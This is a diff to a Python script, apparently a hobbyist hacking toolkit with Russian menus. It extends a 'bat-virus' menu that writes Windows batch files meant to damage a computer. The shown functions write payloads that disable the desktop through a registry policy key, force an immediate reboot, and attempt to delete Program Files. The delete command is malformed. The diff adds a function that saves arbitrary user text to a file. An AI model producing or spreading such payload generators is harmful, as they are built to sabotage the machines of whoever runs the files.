@@ -989,6 +989,7 @@ def viruses():
 		\033[36m[1]-\033[34mУбить компьютер
 		\033[36m[2]-\033[34mПерезагрузка компьютера
 		\033[36m[3]-\033[34mУдаляет все файлы в program files
+		\033[36m[4]-\033[34mЗаписать свой батник[Скоро]
 		
 		\033[36m[98]-\033[34mМои батники
 		\033[36m[99]-\033[33mНазад(Back)
@@ -997,29 +998,42 @@ def viruses():
 		print(text)
 		bat = int(input('\033[31mbat-virus\033[39m~#:'))
 		def bat1():
+			clean()
 			os.chdir('batniki')
 			n = str(input('\033[35mИмя вашего батника .bat :'))
 			k = open(n + '.bat',"w",encoding='utf-8')
 			k.write("""@echo off reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul""")
 			k.close()
 		def bat2():
+			clean()
 			os.chdir('batniki')
 			n = str(input('\033[35mИмя вашего батника .bat :'))
 			k = open(n + '.bat',"w",encoding='utf-8')
 			k.write("""@echo off shutdown -r -t 1 -c "lol" >nul""")
 			k.close()
 		def bat3():
+			clean()
 			os.chdir('batniki')
 			n = str(input('\033[35mИмя вашего батника .bat :'))
 			k = open(n + '.bat',"w",encoding='utf-8')
 			k.write("""del c:Program Files/q""")
 			k.close()
+		def bat4():
+			clean()
+			print('         батник создать:')
+			wrt = input()
+			n = str(input('Имя вашего батника:'))
+			k = open(n + '.txt',"w",encoding='utf-8')
+			k.write(""+str(wrt)+"")
+			k.close()
 		def back():
 			viruses()
 		def bat98():
+			clean()
 			print('\033[32mВот что найдено(Here are the results):')
 			os.chdir('batniki')
 			os.system('ls')
+			os.system('cd batniki')
 		if bat ==1:
 			bat1()
 		elif bat==2:
